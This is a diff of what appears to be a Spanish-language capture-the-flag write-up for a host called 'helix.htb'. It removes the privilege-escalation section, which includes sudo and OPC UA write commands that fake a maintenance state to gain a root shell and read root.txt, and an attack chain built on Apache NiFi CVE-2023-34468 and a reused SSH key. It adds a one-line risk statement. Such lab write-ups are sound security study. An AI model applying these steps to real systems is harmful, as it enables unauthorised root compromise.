-<img width="1131" height="769" alt="image" src="https://github.com/user-attachments/assets/f22387c2-c3e1-44d8-8c69-51b38913eb8a" />
-
-<img width="1343" height="968" alt="image" src="https://github.com/user-attachments/assets/a4d1345b-8649-40f6-9f30-222b07162ce8" />
-
-**Recomendaciones:**
-
-- Separar la documentación operativa de los directorios de configuración.
-- Proteger los manuales internos con control de acceso.
-- Evitar almacenar material sensible en ubicaciones predecibles.
-
----
-
-# 16. Escalada de privilegios a root
-
-La escalada de privilegios a root se basó en una condición operativa muy concreta del entorno, también descrita en la documentación recuperada. Tras revisar los privilegios del usuario `operator`, se confirmó que el binario `/usr/local/sbin/helix-maint-console` podía ejecutarse como root sin contraseña.
-
-La guía PDF también indicaba que, para activar el acceso privilegiado, era necesario simular un estado de mantenimiento del sistema. Para ello se modificaron varios valores mediante escrituras OPC UA, estableciendo el modo de operación en `MAINTENANCE`, activando el indicador correspondiente y ajustando la temperatura a un valor superior al umbral esperado.
-
-Una vez cumplidas esas condiciones, la ejecución de `helix-maint-console` otorgó acceso privilegiado temporal al sistema, lo que hizo posible obtener una shell de root y leer el archivo `root.txt`.
-
-**Comandos utilizados:**
-
-```bash
-sudo -l
-uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=12" -t string "MAINTENANCE"
-uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=13" -t bool true
-uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=6" -t double 11.0
-sudo /usr/local/sbin/helix-maint-console
-cat /root/root.txt
-```
-
-<img width="2091" height="678" alt="image" src="https://github.com/user-attachments/assets/9dac7b9f-484d-4cb4-90ef-a5ed02a8b531" />
-
-**Recomendaciones:**
-
-- Revisar cuidadosamente los binarios delegados con sudo.
-- No depender de condiciones operativas que puedan manipularse con facilidad.
-- Validar que los modos de mantenimiento no puedan activarse externamente sin controles adicionales.
-
----
-
-# 17. Resultados finales
-
-Durante el análisis, se obtuvo acceso inicial mediante la explotación del servicio Apache NiFi, se consiguió una shell inicial como usuario `nifi`, después se localizó una clave privada reutilizable para acceder como `operator` por SSH y, finalmente, se logró la escalada a root manipulando el estado de mantenimiento del sistema.
-
-El compromiso del host se completó por completo, demostrando una cadena de exposición formada por enumeración insuficiente, credenciales reutilizables y validación débil de condiciones operativas.
-
-**Artefactos obtenidos:**
-
-- `user.txt`
-- `root.txt`
-
-**Diagrama de ataque:**
-
-```text
-Nmap
-↓
-helix.htb
-↓
-FFUF
-↓
-flow.helix.htb
-↓
-Apache NiFi 1.21.0
-↓
-CVE-2023-34468
-↓
-Shell (nifi)
-↓
-operator_id_ed25519.bak
-↓
-SSH operator
-↓
-PDF + OPC UA
-↓
-sudo helix-maint-console
-↓
-root
-```
+Esto representa un riesgo crítico para la organización, ya que un atacante podría tomar control total de los sistemas, acceder a información sensible y comprometer la integridad del entorno.
